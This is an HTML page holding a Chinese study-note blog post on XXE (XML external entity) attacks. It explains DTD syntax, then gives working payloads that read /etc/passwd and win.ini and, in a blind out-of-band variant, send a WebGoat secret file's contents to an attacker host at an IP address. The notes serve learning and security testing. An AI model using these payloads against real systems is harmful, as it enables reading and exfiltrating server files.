@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。 XML这东西payload感觉还是忘得很快呀，也是方便自己之后回顾吧。 XXEXXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行，已知的最终效果就是读取系统文件或DOS攻击。 理解XXE，其实就是学习XML。 XML&amp;">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB-XXE">
+<meta property="og:url" content="http://lalajun.com/2019/12/03/WEB-XXE/index.html">
+<meta property="og:site_name" content="啦啦菌NODE">
+<meta property="og:description" content="前言最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。 XML这东西payload感觉还是忘得很快呀，也是方便自己之后回顾吧。 XXEXXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行，已知的最终效果就是读取系统文件或DOS攻击。 理解XXE，其实就是学习XML。 XML&amp;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-03T09:05:30.450Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WEB-XXE">
+<meta name="twitter:description" content="前言最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。 XML这东西payload感觉还是忘得很快呀，也是方便自己之后回顾吧。 XXEXXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行，已知的最终效果就是读取系统文件或DOS攻击。 理解XXE，其实就是学习XML。 XML&amp;">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>WEB-XXE</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/11/30/JDK反序列化Gadgets 7u21/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2019/12/03/WEB-XXE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2019/12/03/WEB-XXE/&text=WEB-XXE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2019/12/03/WEB-XXE/&is_video=false&description=WEB-XXE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WEB-XXE&body=Check out this article: http://lalajun.com/2019/12/03/WEB-XXE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2019/12/03/WEB-XXE/&name=WEB-XXE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">2.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-amp-DTD"><span class="toc-number">2.1.</span> <span class="toc-text">XML&amp;DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML结构"><span class="toc-number">2.1.1.</span> <span class="toc-text">XML结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD内部文档声明"><span class="toc-number">2.1.2.</span> <span class="toc-text">DTD内部文档声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD外部文档声明"><span class="toc-number">2.1.3.</span> <span class="toc-text">DTD外部文档声明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD声明"><span class="toc-number">2.2.</span> <span class="toc-text">DTD声明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD声明元素"><span class="toc-number">2.2.1.</span> <span class="toc-text">DTD声明元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD声明属性"><span class="toc-number">2.2.2.</span> <span class="toc-text">DTD声明属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD声明实体"><span class="toc-number">2.2.3.</span> <span class="toc-text">DTD声明实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE分类"><span class="toc-number">2.3.</span> <span class="toc-text">XXE分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用攻击payload"><span class="toc-number">2.4.</span> <span class="toc-text">常用攻击payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-经典XXE"><span class="toc-number">2.4.1.</span> <span class="toc-text">0x01.经典XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-XXE盲注"><span class="toc-number">2.4.2.</span> <span class="toc-text">0x02.XXE盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一个疑问"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">一个疑问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-报错注入"><span class="toc-number">2.4.3.</span> <span class="toc-text">0x03.报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-DOS攻击"><span class="toc-number">2.4.4.</span> <span class="toc-text">0x04.DOS攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#协议绕过"><span class="toc-number">2.5.</span> <span class="toc-text">协议绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA组件案例"><span class="toc-number">2.6.</span> <span class="toc-text">JAVA组件案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-DocumentBuilder"><span class="toc-number">2.6.1.</span> <span class="toc-text">0x01.DocumentBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SAXBuilder"><span class="toc-number">2.6.2.</span> <span class="toc-text">0x02.SAXBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-SAXParserFactory"><span class="toc-number">2.6.3.</span> <span class="toc-text">0x03.SAXParserFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-SAXTransformerFactory"><span class="toc-number">2.6.4.</span> <span class="toc-text">0x04.SAXTransformerFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-SAXReader"><span class="toc-number">2.6.5.</span> <span class="toc-text">0x05.SAXReader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-XMLReader"><span class="toc-number">2.6.6.</span> <span class="toc-text">0x06.XMLReader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-SchemaFactory"><span class="toc-number">2.6.7.</span> <span class="toc-text">0x07.SchemaFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-XMLInputFactory"><span class="toc-number">2.6.8.</span> <span class="toc-text">0x08.XMLInputFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-TransformerFactory"><span class="toc-number">2.6.9.</span> <span class="toc-text">0x09.TransformerFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-Validator"><span class="toc-number">2.6.10.</span> <span class="toc-text">0x10.Validator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-Unmarshaller"><span class="toc-number">2.6.11.</span> <span class="toc-text">0x11.Unmarshaller</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">2.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        WEB-XXE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">啦啦菌NODE</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-03T09:05:33.000Z" itemprop="datePublished">2019-12-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。</p>
+<p>XML这东西payload感觉还是忘得很快呀，也是方便自己之后回顾吧。</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行，已知的最终效果就是读取系统文件或DOS攻击。</p>
+<p>理解XXE，其实就是学习XML。</p>
+<h2 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h2><p>XML(Extensible Markup Language)，全称为可扩展标记语言，是一种传输的数据格式<br>DTD(Document Type Definition),全称为文档类型定义，是XML文档中的一部分，用来定义元素。</p>
+<p>可以参考官方的<a href="https://www.ibm.com/developerworks/cn/xml/x-entities/#l6" target="_blank" rel="noopener">xml基础教程</a></p>
+<h3 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h3><p>XML总体是由<code>元素</code>（如<code>&lt;message&gt;</code>）组成。<br>元素可以额外附加<code>属性</code>，需要提前定义。<br>元素中可以引用<code>实体</code>，相当于变量，存在内置变量和自定义变量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内置变量 --&gt;</span></span><br><span class="line">&amp;lt;	<span class="tag">&lt;</span></span><br><span class="line"><span class="tag">&amp;<span class="attr">gt</span>;	&gt;</span></span><br><span class="line">&amp;amp;	&amp;</span><br><span class="line">&amp;quot;	"</span><br><span class="line">&amp;apos;	'</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">"100"</span> /&gt;</span> &amp;a; <span class="tag">&lt;/<span class="name">square</span>&gt;</span></span><br><span class="line">  元素    属性         实体</span><br></pre></td></tr></table></figure>
+<h3 id="DTD内部文档声明"><a href="#DTD内部文档声明" class="headerlink" title="DTD内部文档声明"></a>DTD内部文档声明</h3><p>当DTD存在于XML源文件中，由以下格式进行包裹<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>然后XML文件对于DTD的内容进行引用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [ </span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT to      (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT from    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT body    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>可以看到在DTD设置了一些变量，然后在xml文档中再使用到这些变量。这就是DTD与XML之间的使用方法。</p>
+</blockquote>
+<h3 id="DTD外部文档声明"><a href="#DTD外部文档声明" class="headerlink" title="DTD外部文档声明"></a>DTD外部文档声明</h3><p>从xml文件外部引入DTD：<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>note.dtd</code>:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span> (<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h2><p>DTD中可以</p>
+<ul>
+<li>声明<strong>元素</strong>（标签）：<code>&lt;!ELEMENT...</code> </li>
+<li>为元素声明<strong>属性</strong>（标签属性）：<code>&lt;!ATTLIST...</code></li>
+<li>声明<strong>实体</strong>：<code>&lt;!ENTITY...</code></li>
+</ul>
+<h3 id="DTD声明元素"><a href="#DTD声明元素" class="headerlink" title="DTD声明元素"></a>DTD声明元素</h3><ul>
+<li><code>&lt;!ELEMENT 元素名称 类别&gt;</code><ul>
+<li>类别：EMPTY,(#PCDATA),(#CDDATA),ANY<ul>
+<li>PCDATA：会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</li>
+<li>CDDATA：不会被解析器解析的文本</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>&lt;!ELEMENT 元素名称 (元素内容)&gt;</code><ul>
+<li>多个元素内容：(子元素名称 1,子元素名称 2,…..)</li>
+<li>元素内容次数：默认只出现一次。<ul>
+<li>最少出现一个：(子元素名称+)</li>
+<li>出现0次或多次：(子元素名称*)</li>
+<li>出现0次或1次：(子元素名称?)</li>
+<li>或：(message|body)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>混合类别和元素内容：<ul>
+<li>&lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt;</li>
+</ul>
+</li>
+</ul>
+<h3 id="DTD声明属性"><a href="#DTD声明属性" class="headerlink" title="DTD声明属性"></a>DTD声明属性</h3><p><code>&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></p>
+<ul>
+<li>属性：<ul>
+<li>CDATA    值为字符数据 (character data)</li>
+<li>(en1|en2|..)    此值是枚举列表中的一个值</li>
+<li>ID    值为唯一的 id</li>
+<li>IDREF    值为另外一个元素的 id</li>
+<li>IDREFS    值为其他 id 的列表</li>
+<li>NMTOKEN    值为合法的 XML 名称</li>
+<li>NMTOKENS    值为合法的 XML 名称的列表</li>
+<li>ENTITY    值是一个实体</li>
+<li>ENTITIES    值是一个实体列表</li>
+<li>NOTATION    此值是符号的名称</li>
+<li>xml:    值是一个**预定义的 XML 值</li>
+</ul>
+</li>
+<li>默认值：<ul>
+<li>值    属性的默认值</li>
+<li>#REQUIRED    属性值是必需的</li>
+<li>#IMPLIED    属性不是必需的</li>
+<li>#FIXED value    属性值是固定的</li>
+</ul>
+</li>
+</ul>
+<p>DTD声明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT square EMPTY&gt;</span><br><span class="line">&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>XML使用：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">"100"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="DTD声明实体"><a href="#DTD声明实体" class="headerlink" title="DTD声明实体"></a>DTD声明实体</h3><p>命名实体(内部实体)：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>外部实体：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code><br>参数实体：<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code>（只在DTD中有效）<br>外部参数实体：<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code>（只在DTD中有效）</p>
+<blockquote>
+<p>声明外部实体/命名实体时，指定实体的名称及其替代文本。替代文本可以包含字符实体、命名实体和元素等，但不包含参数实体。</p>
+</blockquote>
+<p>DTD声明：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Bill</span> <span class="attr">Gates</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">W3School.com.cn</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>//<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>?%<span class="attr">other_file</span>;"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>XML使用：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>参数实体DTD中使用：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://x.x.x.x/xxe.xml?c=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="XXE分类"><a href="#XXE分类" class="headerlink" title="XXE分类"></a>XXE分类</h2><ol>
+<li>经典XXE：外部实体可以引入</li>
+<li>XXE盲注：没有回显或错误信息</li>
+<li>报错XXE：通过报错信息获取</li>
+<li>DOS攻击：用于不断循环实体变量，导致内存爆炸。</li>
+</ol>
+<h2 id="常用攻击payload"><a href="#常用攻击payload" class="headerlink" title="常用攻击payload"></a>常用攻击payload</h2><h3 id="0x01-经典XXE"><a href="#0x01-经典XXE" class="headerlink" title="0x01.经典XXE"></a>0x01.经典XXE</h3><p>使用<strong>外部实体</strong>进行文件读取。<br>条件：</p>
+<ol>
+<li>可以引用外部实体</li>
+<li>服务器要回显结果</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还可以使用<strong>外部参数实体</strong>+<strong>外部实体</strong>进行文件读取。<br>攻击者发受害者<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM "http://xxxx/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;evil;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>攻击者远程文件<code>evil.dtd</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">evil</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>" &gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这个就绕过了个弯子，没太大意思。</p>
+<h3 id="0x02-XXE盲注"><a href="#0x02-XXE盲注" class="headerlink" title="0x02.XXE盲注"></a>0x02.XXE盲注</h3><p>使用<strong>远程dtd读取</strong>，<strong>外部参数实体</strong>，<strong>外部实体</strong>进行文件读取。<br>条件：</p>
+<ol>
+<li>可以使用外部实体</li>
+<li>可以使用远程dtd读取</li>
+<li>可以使用外部参数实体</li>
+<li>受害者与攻击者远程机网络可达</li>
+<li>需要有远程攻击机放置xml文件以及接受结果</li>
+</ol>
+<p>攻击者主机xml文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">webgoat</span>/<span class="attr">.webgoat-8.0.0.M25</span>/<span class="attr">XXE</span>/<span class="attr">secret.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://47.102.137.160:1234/xxe.xml?c=%file;'&gt;"&gt;</span><br><span class="line">%print;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这一部构造参数实体 print，再执行得到send命名实体是必要的。命名实体内部不会解析参数实体</p>
+</blockquote>
+<p>攻击者发送payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE RemoteDTD SYSTEM "http://47.102.137.160:1234/xxe.dtd" &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入&amp;send;即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
